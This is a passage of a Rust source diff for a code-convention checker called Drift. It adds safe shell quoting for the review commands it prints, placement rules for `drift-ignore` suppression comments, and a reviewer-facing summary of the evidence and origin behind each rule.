@@ -57,6 +57,87 @@ fn sanitize_summary(s: &str) -> String {
     sanitize(s, 240)
 }
 
+/// `w` as one POSIX shell word, for a command a person is told to paste: bare when it
+/// holds only characters no shell reads specially (and does not start with `-`, so it
+/// is never read as an option), else in single quotes, where nothing is special except
+/// the quote itself (written `'\''`). [`sanitize`] is for prose and leaves `$`, `\`,
+/// `;` and the double quote alone, so it never quotes a command. The same rule as the commands
+/// `drift practices promote` prints.
+pub fn shell_word(w: &str) -> String {
+    let plain = !w.is_empty()
+        && !w.starts_with('-')
+        && w.chars()
+            .all(|c| c.is_ascii_alphanumeric() || "-_./@+:,=".contains(c));
+    if plain {
+        w.to_string()
+    } else {
+        format!("'{}'", w.replace('\'', "'\\''"))
+    }
+}
+
+/// Whether `w` can be printed whole inside a command shown to a person and an agent:
+/// no control character (a newline would end the command), none of the characters
+/// [`sanitize`] rewrites as markup (the command must name the real member, so it is
+/// never rewritten), and at most `max` characters (never cut: a cut name names
+/// nothing). Where it cannot, the surface says to do it by hand instead.
+fn printable_word(w: &str, max: usize) -> bool {
+    !w.is_empty()
+        && w.chars().count() <= max
+        && !w.chars().any(|c| c.is_control() || "`<>".contains(c))
+}
+
+/// What a surface says in place of the command that marks a member fine, when the
+/// member's path or name cannot be printed in one ([`printable_word`]).
+pub const MARK_BY_HAND: &str = "its path or name holds characters Drift does not print in a command: a person marks it fine by hand (`drift review --exempt`)";
+
+/// What a surface says in place of the commands that demote or reject a rule, when its
+/// id cannot be printed in one.
+pub const WRONG_BY_HAND: &str = "its id holds characters Drift does not print in a command: a person changes it by hand (`drift review`)";
+
+/// The commands a reviewer is told to paste about a violation of `id` by `symbol` in
+/// `rel` ([`Trust::mark_fine`], [`Trust::mark_by_hand`], [`Trust::wrong_rule`]). They name
+/// the real id and member, each quoted as one shell word ([`shell_word`]), never
+/// sanitized prose: a path holding `$(…)` or a quote must not run anything when pasted,
+/// and a rewritten or cut path names nothing. What cannot be printed whole (a control
+/// character, markup, past the caps, a member `drift review` would refuse) is left to
+/// be done by hand. `member_kept`: the violation has a member an exception keeps (not
+/// wiring advice); `blocks`: it fails the check, so demoting it is offered.
+pub fn dispute_commands(
+    id: &str,
+    rel: &str,
+    symbol: &str,
+    member_kept: bool,
+    blocks: bool,
+) -> (Option<String>, bool, Vec<(String, &'static str)>) {
+    let id_ok = printable_word(id, MAX_IDENT);
+    let member = format!("{rel}#{symbol}");
+    let member_ok = id_ok
+        && printable_word(&member, MAX_PATH + 1 + MAX_IDENT)
+        && crate::policy::exception_member(&member).is_ok();
+    let mark_fine = (member_kept && member_ok).then(|| {
+        format!(
+            "drift review --exempt {} --member {} --reason '<why>'",
+            shell_word(id),
+            shell_word(&member)
+        )
+    });
+    let mark_by_hand = member_kept && !member_ok;
+    let mut wrong_rule = Vec::new();
+    if id_ok {
+        if blocks {
+            wrong_rule.push((
+                format!("drift review --advise {}", shell_word(id)),
+                "keeps it as advice, so it no longer fails the check",
+            ));
+        }
+        wrong_rule.push((
+            format!("drift review --reject {}", shell_word(id)),
+            "drops it",
+        ));
+    }
+    (mark_fine, mark_by_hand, wrong_rule)
+}
+
 /// A suggestion-tier convention that advises. One a person forced into block mode
 /// blocks like any other and is not labelled as a suggestion.
 fn is_suggestion(v: &Violation) -> bool {
@@ -139,13 +220,23 @@ pub fn agent_message(violations: &[&Violation], at: AgentAt) -> String {
         }
         AgentAt::Check => format!("{blocks} marked (blocks) fail `drift check`; {advice} advice"),
     };
+    // The drift-ignore way out is offered only where a comment can cover the violation
+    // ([`suppression_hint`]); otherwise only a person can mark it fine.
+    let ignorable = violations
+        .iter()
+        .any(|v| v.mode == "block" && suppression_hint(v).is_some());
+    let out_of_it = if ignorable {
+        "add the drift-ignore comment shown with a real reason"
+    } else {
+        "say so to a person: only they can mark it fine (`drift review`)"
+    };
     let what = if blocks == 0 {
         ADVICE_FIT.to_string()
     } else if at == AgentAt::EndOfTurn || advice == 0 {
-        "Fix each, or, if one is an intentional exception, add the drift-ignore comment shown with a real reason.".to_string()
+        format!("Fix each, or, if one is an intentional exception, {out_of_it}.")
     } else {
         format!(
-            "Fix those marked (blocks), or, if one is an intentional exception, add the drift-ignore comment shown with a real reason. {ADVICE_FIT}"
+            "Fix those marked (blocks), or, if one is an intentional exception, {out_of_it}. {ADVICE_FIT}"
         )
     };
     let mut out = String::new();
@@ -185,13 +276,17 @@ pub fn why_line(evidence: &str) -> String {
     format!("{evidence} of its role follow it")
 }
 
-/// The listed violations of an agent message, at most [`MAX_AGENT_VIOLATIONS`];
-/// with `mark_blocks`, block-mode ones are marked `(blocks)`; with `offer_ignore`,
-/// block-mode ones (and only those) offer the `drift-ignore` comment for an intentional
-/// exception. Each says why the rule exists (its evidence); its known exceptions are in
-/// its statement (", except ...").
+/// The listed violations of an agent message, at most [`MAX_AGENT_VIOLATIONS`],
+/// block-mode ones first (each group in the order given), so that with many more
+/// conventions than fit, what blocks is never the part cut off; the line that says how
+/// many more there are says how many of them block. With `mark_blocks`, block-mode ones
+/// are marked `(blocks)`; with `offer_ignore`, block-mode ones (and only those) offer
+/// the `drift-ignore` comment for an intentional exception, where one can go
+/// ([`suppression_hint`]). Each says why the rule exists (its evidence); its known
+/// exceptions are in its statement (", except ...").
 fn agent_items(out: &mut String, violations: &[&Violation], mark_blocks: bool, offer_ignore: bool) {
-    let shown = &violations[..violations.len().min(MAX_AGENT_VIOLATIONS)];
+    let ordered = worst_first(violations);
+    let shown = &ordered[..ordered.len().min(MAX_AGENT_VIOLATIONS)];
     if shown.iter().any(|v| is_suggestion(v)) {
         out.push_str(
             "(suggestion) marks a weaker convention: advice only; follow it where it fits.\n",
@@ -213,14 +308,12 @@ fn agent_items(out: &mut String, violations: &[&Violation], mark_blocks: bool, o
             ),
             (None, None) => String::new(),
         };
-        let ignore = if offer_ignore && v.mode == "block" {
-            format!(
-                "  if intentional: add `{} drift-ignore {}: <reason>` above the declaration (shown to reviewers)\n",
-                comment_marker(&v.path),
-                sanitize(&v.id, 16),
-            )
-        } else {
-            String::new()
+        let ignore = match suppression_hint(v) {
+            _ if !offer_ignore || v.mode != "block" => String::new(),
+            Some((comment, place)) => {
+                format!("  if intentional: add `{comment}` {place} (shown to reviewers)\n")
+            }
+            None => "  if intentional: no drift-ignore comment can go in this file; say so to a person, who can mark it fine (`drift review`)\n".to_string(),
         };
         // A layering violation names the import that breaks the rule; "like <holder>"
         // says nothing about what to change for an avoid rule, so it is left out.
@@ -244,16 +337,46 @@ fn agent_items(out: &mut String, violations: &[&Violation], mark_blocks: bool, o
             sanitize_summary(&crate::mine::agent_summary(&v.summary)),
             sanitize(&v.path, MAX_PATH),
             v.line,
-            sanitize(&what, MAX_PATH),
+            sanitize(&what, MAX_PATH + 120),
             why_line(&sanitize(&v.evidence, 16)),
         ));
     }
     if violations.len() > MAX_AGENT_VIOLATIONS {
         out.push_str(&format!(
-            "+{} more: run `drift check` to see all\n",
-            violations.len() - MAX_AGENT_VIOLATIONS
+            "+{} more{}: run `drift check` to see all\n",
+            violations.len() - MAX_AGENT_VIOLATIONS,
+            cut_counts(&ordered[MAX_AGENT_VIOLATIONS..])
         ));
     }
+}
+
+/// `violations` with the block-mode ones first, each group in the order given: what a
+/// capped list keeps.
+fn worst_first<'a>(violations: &[&'a Violation]) -> Vec<&'a Violation> {
+    let mut out = violations.to_vec();
+    out.sort_by_key(|v| v.mode != "block");
+    out
+}
+
+/// What a capped list left out, by mode: ` (2 that block, 3 advice)`; a mode none of
+/// them has is not named, so a list of advice never speaks of blocking.
+fn cut_counts(cut: &[&Violation]) -> String {
+    let blocks = cut.iter().filter(|v| v.mode == "block").count();
+    cut_note(blocks, cut.len() - blocks)
+}
+
+/// `cut_counts` from the counts: ` (2 that block, 3 advice)`, for any capped list
+/// whose items are not violations (rules primed before a write, rules exported), so
+/// every cut line in the product says the same thing the same way.
+pub fn cut_note(blocks: usize, advice: usize) -> String {
+    let mut parts = Vec::new();
+    if blocks > 0 {
+        parts.push(format!("{blocks} that block"));
+    }
+    if advice > 0 {
+        parts.push(format!("{advice} advice"));
+    }
+    format!(" ({})", parts.join(", "))
 }
 
 /// Exempt members named in one hook line before pointing to `drift check`.
@@ -411,23 +534,43 @@ pub fn github_escape_property(s: &str) -> String {
         .replace(',', "%2C")
 }
 
-/// The comment that suppresses `id` above a declaration in `path`, or `None` where
-/// suppressions do not apply (files, packages, models).
-fn suppression_hint(v: &Violation) -> Option<String> {
-    if !matches!(v.extent, Extent::Symbol { .. }) {
-        return None;
-    }
-    Some(format!(
+/// The comment that suppresses `v`, and where it goes: above the declaration for a
+/// symbol; for a file, a model or a package, at the top of its file
+/// ([`crate::roles::apply_file_ignores`]), or on the line of the import a layering rule
+/// is about, or above the model. `None` where no comment can cover it, so nothing
+/// offers one: a manifest without comments (`package.json`), and wiring advice or a
+/// promoted practice that is not a declaration (their comments are their
+/// declarations').
+fn suppression_hint(v: &Violation) -> Option<(String, &'static str)> {
+    let comment = format!(
         "{} drift-ignore {}: <reason>",
         comment_marker(&v.path),
         sanitize(&v.id, 16)
-    ))
+    );
+    let place = match v.extent {
+        Extent::Symbol { .. } => "above the declaration",
+        _ if v.wire.is_some() || v.practice.is_some() || !takes_comments(&v.path) => {
+            return None;
+        }
+        Extent::Model { .. } => "directly above the model, or at the top of its file",
+        Extent::File if v.import.is_some() => "on the import's line, or at the top of the file",
+        Extent::File => "at the top of the file",
+    };
+    Some((comment, place))
+}
+
+/// Whether a file at `path` can hold a comment: every file Drift reads but a JSON one.
+fn takes_comments(path: &str) -> bool {
+    !path.ends_with(".json")
 }
 
 /// The line-comment marker of the language `path` is written in.
 fn comment_marker(path: &str) -> &'static str {
-    if path.ends_with(".py") || path.ends_with(".pyi") {
+    let hash = [".py", ".pyi", ".toml", ".txt", ".yaml", ".yml", ".cfg"];
+    if hash.iter().any(|e| path.ends_with(e)) {
         "#"
+    } else if path.ends_with(".sql") {
+        "--"
     } else {
         "//"
     }
@@ -439,6 +582,15 @@ fn comment_marker(path: &str) -> &'static str {
 /// Repository text is sanitised as for agents; the file property and the message
 /// are then escaped by the workflow-command rules.
 pub fn github_annotations(violations: &[&Violation]) -> String {
+    github_annotations_with(violations, &Basis::default(), "")
+}
+
+/// [`github_annotations`], each message followed by what the rule rests on
+/// ([`Basis::trust`], [`trust_annotation`]): the lines before it stay as they were, so a
+/// reader of the first lines reads what it always did. `prefix`: what the violations'
+/// paths carry before the repository-relative path the basis was read with (a check
+/// run from a subdirectory of the git top level).
+pub fn github_annotations_with(violations: &[&Violation], basis: &Basis, prefix: &str) -> String {
     let mut out = String::new();
     for v in violations {
         let lvl = level(v);
@@ -450,18 +602,26 @@ pub fn github_annotations(violations: &[&Violation]) -> String {
             }
         };
         let exception = match suppression_hint(v) {
-            Some(c) => format!(
-                "If intentional, add `{c}` directly above the declaration (shown to reviewers)."
+            Some((c, place)) => format!(
+                "If intentional, add `{c}` {} (shown to reviewers).",
+                if place == "above the declaration" {
+                    "directly above the declaration"
+                } else {
+                    place
+                }
             ),
             None => "If the convention does not apply, change it with `drift review`.".into(),
         };
-        let message = format!(
+        let mut message = format!(
             "{} ({}): {} does not follow it.\nCopy {}.\n{what}\n{exception}",
             sanitize_summary(&v.summary),
             sanitize(&v.evidence, 16),
             sanitize(&v.symbol, MAX_IDENT),
             sanitize(&v.example, MAX_PATH),
         );
+        if let Some(t) = basis.trust(v, prefix) {
+            message.push_str(&trust_annotation(&t));
+        }
         // The path must stay exact for GitHub to place the annotation: only control
         // characters are dropped before escaping.
         let file: String = v.path.chars().filter(|c| !c.is_control()).collect();
@@ -689,16 +849,18 @@ pub fn github_summary(s: &GithubSummary) -> String {
         }
         if s.new.len() > MAX_SUMMARY_VIOLATIONS {
             out.push_str(&format!(
-                "\n+{} more in the annotations and the log.\n",
-                s.new.len() - MAX_SUMMARY_VIOLATIONS
+                "\n+{} more{} in the annotations and the log.\n",
+                s.new.len() - MAX_SUMMARY_VIOLATIONS,
+                cut_counts(&top[MAX_SUMMARY_VIOLATIONS..])
             ));
         }
         out.push_str(
             "\n**Fix:** make the code follow the convention; each annotation names an \
              example to copy, and `drift example <file>` finds one for any file. \
              **Intentional exception:** add `// drift-ignore <id>: <reason>` \
-             (`# drift-ignore` in Python) directly above the declaration; the reason is \
-             shown to reviewers. **Wrong convention:** change or reject it with `drift review`.\n",
+             (`# drift-ignore` in Python) directly above the declaration, or at the top of \
+             the file for a rule about a whole file (a `package.json` takes none); the \
+             reason is shown to reviewers. **Wrong convention:** change or reject it with `drift review`.\n",
         );
     }
     let mut notes = Vec::new();
@@ -779,6 +941,778 @@ pub fn github_summary(s: &GithubSummary) -> String {
         for n in notes {
             out.push_str(&format!("- {n}\n"));
         }
+    }
+    out
+}
+
+// What a reviewer needs before trusting a failed check (audit 6, "what a reviewer needs
+// before trusting a block"): the rule in one sentence and where it came from, the
+// evidence a person accepted beside the evidence now, where it holds near the violation
+// and the member to copy, what the unit does instead, how to dispute it, and what Drift
+// could not read. Every surface (`drift check`'s text, the GitHub annotations and job
+// summary, `drift card`) says it from one [`Trust`], with the same labels. Who accepted
+// a rule and when is not said: `.drift/conventions.yaml` and `drift.lock` record neither,
+// and the review log (opt-in, local, never committed) records a time but never a person,
+// so a check in CI has nothing to read it from.
+
+use std::collections::{BTreeMap, BTreeSet};
+
+use drift_core::RepoFacts;
+
+use crate::check::{CheckReport, Standing};
+use crate::mine::{Rule, Told};
+use crate::policy::{Convention, ConventionsFile, Status};
+
+/// Members named as following a rule near one violation, besides the one to copy.
+pub const MAX_HELD: usize = 3;
+/// Violations of one rule given lines of their own in [`trust_text`], before "N more".
+pub const MAX_TRUST_VIOLATIONS: usize = 5;
+/// Rules described by [`trust_text`] and [`trust_summary`], before "N more".
+pub const MAX_TRUST_RULES: usize = 10;
+/// Reasons a rule's members were not checked named in one line, before "N more".
+pub const MAX_NOT_CHECKED_WHY: usize = 2;
+
+/// A member that follows a rule ([`Basis`]): where a reviewer can see it hold.
+#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
+pub struct Held {
+    pub path: String,
+    pub line: u32,
+    pub symbol: String,
+}
+
+impl Held {
+    /// `path:line symbol`; the path alone for a whole file; `path#symbol` where the line
+    /// is not known (an example no unit of the facts is).
+    fn text(&self) -> String {
+        if self.symbol == crate::roles::FILE_UNIT {
+            sanitize(&self.path, MAX_PATH)
+        } else if self.line == 0 {
+            sanitize(&format!("{}#{}", self.path, self.symbol), MAX_PATH)
+        } else {
+            format!(
+                "{}:{} {}",
+                sanitize(&self.path, MAX_PATH),
+                self.line,
+                sanitize(&self.symbol, MAX_IDENT)
+            )
+        }
+    }
+}
+
+/// Where an accepted convention came from, said the same way on every surface: mined
+/// from the code, promoted by a person, or proposed by Drift from one of its maps
+/// ([`Convention::from_map`]), which passes none of mining's gates.
+pub fn origin(c: &Convention) -> &'static str {
+    match c.from_map.as_deref() {
+        Some("practice") => {
+            "proposed by Drift from the practice map (not mined), accepted by a person"
+        }
+        Some("layering") => {
+            "proposed by Drift from the structure map (not mined), accepted by a person"
+        }
+        Some("manifest") => {
+            "proposed by Drift from the package manifests (not mined), accepted by a person"
+        }
+        Some(_) => "proposed by Drift from a map (not mined), accepted by a person",
+        None if c.promoted_from_practice.is_some() => "promoted from the practice map by a person",
+        None if c.promoted_from_hidden => "mined, withheld from review, promoted by a person",
+        None => "mined from the code, accepted by a person",
+    }
+}
+
+/// What a reviewer reads about one reported violation ([`Basis::trust`]). Repository
+/// text in it is already sanitized ([`sanitize`]); the commands and the comment are
+/// meant to be quoted as code by each surface, the rest is plain words each surface
+/// escapes as its own lines are escaped.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Trust {
+    pub id: String,
+    /// Its convention blocks as checked now.
+    pub blocks: bool,
+    /// The rule in one sentence.
+    pub rule: String,
+    /// [`origin`].
+    pub origin: &'static str,
+    /// `accepted at 38 of 40; today 38 of 41, 3 not checked`: what the person saw when
+    /// they accepted it ([`Convention::accepted_evidence`], left out where a Drift from
+    /// before kept none) beside what this check read ([`Standing`]).
+    pub evidence: Option<String>,
+    /// Why the rule went stale, or why it advises though the file says block, as the
+    /// check computed it.
+    pub changed: Vec<String>,
+    /// Members Drift could not read, counted with the first reasons: never reported.
+    pub not_checked: Option<String>,
+    /// The member to copy.
+    pub copy: Option<String>,
+    /// Up to [`MAX_HELD`] members that follow it, nearest the violation first.
+    pub held: Vec<String>,
+    /// `path:line symbol` of the violation.
+    pub at: String,
+    /// What the unit does instead, in plain words.
+    pub instead: String,
+    /// The `drift-ignore` comment that records an exception for this unit, and where it
+    /// goes; only where one can work.
+    pub comment: Option<(String, String)>,
+    /// The command a person runs to mark this unit fine (`drift review --exempt`).
+    pub mark_fine: Option<String>,
+    /// No command is printed to mark this unit fine because its path or name cannot be
+    /// printed in one: the surface says [`MARK_BY_HAND`] instead.
+    pub mark_by_hand: bool,
+    /// The commands that demote or reject the rule, each with what it does; empty when
+    /// its id cannot be printed in one (the surface says [`WRONG_BY_HAND`]).
+    pub wrong_rule: Vec<(String, &'static str)>,
+}
+
+/// What a check's report rests on, per accepted convention: read once for a run, then
+/// asked about each violation ([`Basis::trust`]). [`Basis::of`] reads the policy and the
+/// report; [`Basis::new`] also reads the facts, for the members that follow each rule
+/// that reported a new violation and what a wrapper rule's violator is wrapped in
+/// instead. Empty ([`Default`]), it knows no convention and says nothing.
+#[derive(Debug, Default)]
+pub struct Basis<'a> {
+    conventions: BTreeMap<&'a str, &'a Convention>,
+    standing: BTreeMap<&'a str, &'a Standing>,
+    practice_not_checked: BTreeMap<&'a str, usize>,
+    practice_stale: BTreeSet<&'a str>,
+    /// Per convention id: the members that follow it, sorted.
+    held: BTreeMap<String, Vec<Held>>,
+    /// Per convention id: its example, where a unit of the facts is it.
+    example: BTreeMap<String, Held>,
+    /// Package of each file, by path.
+    packages: BTreeMap<String, String>,
+    /// `(id, path, symbol)` of a violation: what it does instead, read from the facts.
+    instead: BTreeMap<(String, String, String), String>,
+}
+
+impl<'a> Basis<'a> {
+    /// What `policy` and `report` (a check of it) say of each convention, without the
+    /// facts: no members that follow it are named.
+    pub fn of(policy: &'a ConventionsFile, report: &'a CheckReport) -> Self {
+        Basis {
+            conventions: policy
+                .conventions
+                .iter()
+                .map(|c| (c.id.as_str(), c))
+                .collect(),
+            standing: report.standing.iter().map(|s| (s.id.as_str(), s)).collect(),
+            practice_not_checked: report
+                .practices_not_checked
+                .iter()
+                .map(|n| (n.id.as_str(), n.units))
+                .collect(),
+            practice_stale: report
+                .stale_practices
+                .iter()
+                .map(|s| s.id.as_str())
+                .collect(),
+            ..Basis::default()
+        }
+    }
+
+    /// [`Basis::of`], with what the facts of `repo` (those `report` was checked on, paths
+    /// relative to the policy's root) say of the rules that reported a new violation:
+    /// the members that follow each, as `drift check` reads them ([`Rule::tell_in`]: a
+    /// member Drift cannot tell is not one), and, for a wrapper rule, what its violator
+    /// is wrapped in instead. A promoted practice is read from the practice map, not
+    /// from units: its example is the member it names.
+    pub fn new(repo: &RepoFacts, policy: &'a ConventionsFile, report: &'a CheckReport) -> Self {
+        let mut basis = Self::of(policy, report);
+        let new: Vec<&Violation> = report.new_violations().collect();
+        let ids: BTreeSet<&str> = new.iter().map(|v| v.id.as_str()).collect();
+        if ids.is_empty() {
+            return basis;
+        }
+        basis.packages = repo
+            .files
+            .iter()
+            .map(|f| (f.path.clone(), f.package.clone()))
+            .collect();
+        let mut instead: Vec<((String, String, String), String)> = Vec::new();
+        for v in &new {
+            let Some(c) = policy.conventions.iter().find(|c| c.id == v.id) else {
+                continue;
+            };
+            if let Some(words) = wrapped_instead(repo, c, v) {
+                instead.push(((v.id.clone(), v.path.clone(), v.symbol.clone()), words));
+            }
+        }
+        basis.instead = instead.into_iter().collect();
+        // Each member is read in the part of a merged card it is a member of, as the
+        // check reads it.
+        let parts = policy.by_part();
+        let wanted: Vec<&Convention> = parts
+            .conventions
+            .iter()
+            .filter(|c| {
+                c.status == Status::Accepted
+                    && ids.contains(c.id.as_str())
+                    && !c.rule.is_wiring()
+                    && !c.rule.is_practice()
+            })
+            .collect();
+        if wanted.is_empty() {
+            return basis;
+        }
+        // A member that breaks the rule, or that the rule is not about, is no member to
+        // point a reviewer at.
+        let apart: BTreeSet<(&str, &str, &str)> = report
+            .violations
+            .iter()
+            .map(|v| (v.id.as_str(), v.path.as_str(), v.symbol.as_str()))
+            .chain(
+                report
+                    .exempt
+                    .iter()
+                    .map(|e| (e.id.as_str(), e.path.as_str(), e.symbol.as_str())),
+            )
+            .collect();
+        let all = crate::roles::all_units(repo, &policy.file_kinds);
+        let ctx = crate::context::RepoContext::new(repo, &all);
+        for c in wanted {
+            for u in &all {
+                if !u.in_convention_role(&c.role, c.selector_version) {
+                    continue;
+                }
+                let path = u.path();
+                let name = u.name();
+                let held = Held {
+                    path: path.clone(),
+                    line: u.line(),
+                    symbol: name.to_string(),
+                };
+                if format!("{path}#{name}") == c.example {
+                    basis
+                        .example
+                        .entry(c.id.clone())
+                        .or_insert_with(|| held.clone());
+                }
+                if apart.contains(&(c.id.as_str(), path.as_str(), name))
+                    || c.exception(&u.key()).is_some()
+                    || !c.rule.applies_in(Some(&c.role), &u.view, &ctx)
+                    || c.rule.tell_in(Some(&c.role), &u.view, &ctx) != Told::Holds
+                {
+                    continue;
+                }
+                basis.held.entry(c.id.clone()).or_default().push(held);
+            }
+        }
+        for h in basis.held.values_mut() {
+            h.sort();
+            h.dedup();
+        }
+        basis
+    }
+
+    /// Whether `id` is a convention of the policy this basis read.
+    pub fn knows(&self, id: &str) -> bool {
+        self.conventions.contains_key(id)
+    }
+
+    /// What a reviewer reads about `v` ([`Trust`]); `None` when its convention is not in
+    /// the policy this basis read. `prefix`: what `v`'s path carries before the path the
+    /// basis was read with (the git top level's prefix of a check run in a subdirectory).
+    pub fn trust(&self, v: &Violation, prefix: &str) -> Option<Trust> {
+        let c = *self.conventions.get(v.id.as_str())?;
+        let rel = v.path.strip_prefix(prefix).unwrap_or(&v.path);
+        let id = sanitize(&v.id, 16);
+        let standing = self.standing.get(v.id.as_str()).copied();
+        // Evidence: as accepted, beside as read now. A rule accepted by a Drift that kept
+        // no accepted evidence says only what is read now.
+        let accepted = c
+            .accepted_evidence
+            .as_ref()
+            .map(|a| format!("accepted at {} of {}", a.holders, a.total));
+        let today = standing.filter(|s| s.whole).map(|s| {
+            let unread = if s.not_checked > 0 {
+                format!(", {} not checked", s.not_checked)
+            } else {
+                String::new()
+            };
+            format!("today {} of {}{unread}", s.holders, s.members)
+        });
+        let evidence = [accepted, today].into_iter().flatten().collect::<Vec<_>>();
+        let evidence = (!evidence.is_empty()).then(|| evidence.join("; "));
+        // What changed since, in the check's own words.
+        let mut changed = Vec::new();
+        match standing {
+            Some(s) => match (&s.mode_note, &s.stale) {
+                (Some(note), _) => changed.push(sanitize(note, 240)),
+                (None, Some(why)) => changed.push(format!("it is stale: {}", sanitize(why, 240))),
+                (None, None) => {}
+            },
+            None => {
+                if self.practice_stale.contains(v.id.as_str()) {
+                    changed.push(
+                        "it is stale: no unit of its place does it an accepted way any more"
+                            .to_string(),
+                    );
+                }
+                if let (_, Some(note)) = crate::check::mode_now(c, None) {
+                    changed.push(sanitize(&note, 240));
+                }
+            }
+        }
+        let not_checked = match standing {
+            Some(s) if s.not_checked > 0 => {
+                let mut why: Vec<(&String, &usize)> = s.not_checked_why.iter().collect();
+                why.sort_by(|a, b| b.1.cmp(a.1).then_with(|| a.0.cmp(b.0)));
+                let mut named: Vec<String> = why
+                    .iter()
+                    .take(MAX_NOT_CHECKED_WHY)
+                    .map(|(reason, n)| format!("{} ({n})", sanitize(reason, MAX_PATH)))
+                    .collect();
+                if why.len() > MAX_NOT_CHECKED_WHY {
+                    named.push(format!(
+                        "{} more reason(s) in `drift check --format json` (`standing`)",
+                        why.len() - MAX_NOT_CHECKED_WHY
+                    ));
+                }
+                let head = format!(
+                    "{} member(s) Drift could not read, never reported",
+                    s.not_checked
+                );
+                Some(if named.is_empty() {
+                    head
+                } else {
+                    format!("{head}: {}", named.join("; "))
+                })
+            }
+            Some(_) => None,
+            None => self
+                .practice_not_checked
+                .get(v.id.as_str())
+                .filter(|n| **n > 0)
+                .map(|n| {
+                    format!("{n} unit(s) of its place Drift could not read how they do it, never reported")
+                }),
+        };
+        let copy = match self.example.get(v.id.as_str()) {
+            Some(h) => Some(h.text()),
+            None if !c.example.is_empty() => Some(sanitize(&c.example, MAX_PATH)),
+            None => None,
+        };
+        let at = match &v.import {
+            Some(hit) => format!(
+                "{}:{} {}",
+                sanitize(&v.path, MAX_PATH),
+                v.line,
+                sanitize(&hit.describe(), MAX_PATH + 120)
+            ),
+            None => format!(
+                "{}:{} {}",
+                sanitize(&v.path, MAX_PATH),
+                v.line,
+                sanitize(&v.symbol, MAX_IDENT)
+            ),
+        };
+        let instead = match (&v.import, &v.wire, &v.practice) {
+            (Some(hit), _, _) => format!("it {}", sanitize(&hit.describe(), MAX_PATH + 120)),
+            (_, Some(w), _) => format!(
+                "it is missing where its siblings are: {}",
+                sanitize(&w.describe(&v.symbol), MAX_PATH + 80)
+            ),
+            (_, _, Some(concern)) => format!(
+                "it does not handle {} any of the ways the rule accepts",
+                sanitize(crate::practices::plain_concern(concern), 32)
+            ),
+            _ => match self
+                .instead
+                .get(&(v.id.clone(), rel.to_string(), v.symbol.clone()))
+            {
+                Some(words) => sanitize(words, 240),
+                None => match &c.rule {
+                    Rule::Named { .. } => {
+                        format!("it is named {}", sanitize(&v.symbol, MAX_IDENT))
+                    }
+                    rule => sanitize(&not_doing(rule), 240),
+                },
+            },
+        };
+        let comment = suppression_hint(v).map(|(comment, place)| (comment, place.to_string()));
+        // A reviewer's exception is kept by member; wiring advice has none to keep.
+        let blocks = v.mode == "block";
+        let (mark_fine, mark_by_hand, wrong_rule) =
+            dispute_commands(&v.id, rel, &v.symbol, v.wire.is_none(), blocks);
+        Some(Trust {
+            id,
+            blocks,
+            rule: sanitize_summary(&crate::mine::agent_summary(&v.summary)),
+            origin: origin(c),
+            evidence,
+            changed,
+            not_checked,
+            copy,
+            held: self.near(&v.id, rel, &v.symbol),
+            at,
+            instead,
+            comment,
+            mark_fine,
+            mark_by_hand,
+            wrong_rule,
+        })
+    }
+
+    /// Up to [`MAX_HELD`] members that follow convention `id`, one per file, nearest the
+    /// violation of `symbol` in `rel` first: its own directory, then its package, then
+    /// the most leading directories shared; ties by path and line. The example (named
+    /// apart) and the violation itself are left out.
+    fn near(&self, id: &str, rel: &str, symbol: &str) -> Vec<String> {
+        let Some(all) = self.held.get(id) else {
+            return Vec::new();
+        };
+        let example = self.example.get(id);
+        let dir = |p: &str| {
+            p.rsplit_once('/')
+                .map_or(String::new(), |(d, _)| d.to_string())
+        };
+        let here = dir(rel);
+        let package = self.packages.get(rel);
+        let mut ranked: Vec<&Held> = all
+            .iter()
+            .filter(|h| Some(*h) != example && !(h.path == rel && h.symbol == symbol))
+            .collect();
+        ranked.sort_by_cached_key(|h| {
+            let d = dir(&h.path);
+            let place = if d == here {
+                0u8
+            } else if package.is_some() && self.packages.get(&h.path) == package {
+                1
+            } else {
+                2
+            };
+            let shared = here
+                .split('/')
+                .zip(d.split('/'))
+                .take_while(|(a, b)| a == b)
+                .count();
+            (place, std::cmp::Reverse(shared), h.path.clone(), h.line)
+        });
+        let mut files: BTreeSet<String> = BTreeSet::new();
+        ranked
+            .into_iter()
+            .filter(|h| files.insert(h.path.clone()))
+            .take(MAX_HELD)
+            .map(Held::text)
+            .collect()
+    }
+}
+
+/// What a wrapper rule's violator is wrapped in instead, from its facts: `it is wrapped
+/// in publicProcedure() instead`. `None` when the rule is not a wrapper rule, or the unit
+/// has no wrapper of the rule's kind (then the rule's own words say it).
+fn wrapped_instead(repo: &RepoFacts, c: &Convention, v: &Violation) -> Option<String> {
+    let Rule::WrappedBy { kind, .. } = &c.rule else {
+        return None;
+    };
+    if *kind == drift_core::WrapKind::Try || v.import.is_some() {
+        return None;
+    }
+    let s = repo
+        .files
+        .iter()
+        .find(|f| f.path == v.path)?
+        .symbols
+        .iter()
+        .find(|s| s.name == v.symbol)?;
+    let mut any_of: Vec<String> = s
+        .wraps
+        .iter()
+        .filter(|w| w.kind == *kind)
+        .map(|w| w.wrapper.clone())
+        .collect();
+    any_of.sort();
+    any_of.dedup();
+    if any_of.is_empty() {
+        return None;
+    }
+    let said = Rule::WrappedBy {
+        kind: *kind,
+        any_of,
+    }
+    .describe();
+    Some(match said.strip_prefix("are ") {
+        Some(rest) => format!("it is {rest} instead"),
+        None => match said.split_once(' ') {
+            Some((verb, rest)) => format!("it {verb}s {rest} instead"),
+            None => format!("it {said}s instead"),
+        },
+    })
+}
+
+/// The rule's own words ([`Rule::describe`]) turned on the one unit that breaks it:
+/// `it is not wrapped in withAuth()`, `it does not call requireUser()`, `it does use
+/// eval()`.
+fn not_doing(rule: &Rule) -> String {
+    let said = rule.describe().replace(" their ", " its ");
+    if let Some(rest) = said.strip_prefix("are ") {
+        format!("it is not {rest}")
+    } else if let Some(rest) = said.strip_prefix("do not ") {
+        format!("it does {rest}")
+    } else {
+        format!("it does not {said}")
+    }
+}
+
+/// `violations` that `basis` knows, grouped by rule: the rules with a violation that
+/// blocks first, then by id; each rule's violations by path and line.
+fn by_rule<'v>(violations: &[&'v Violation], basis: &Basis) -> Vec<Vec<&'v Violation>> {
+    let mut ordered: Vec<&Violation> = violations
+        .iter()
+        .copied()
+        .filter(|v| basis.knows(&v.id))
+        .collect();
+    ordered.sort_by(|a, b| {
+        (level(a), &a.id, &a.path, a.line, &a.symbol).cmp(&(
+            level(b),
+            &b.id,
+            &b.path,
+            b.line,
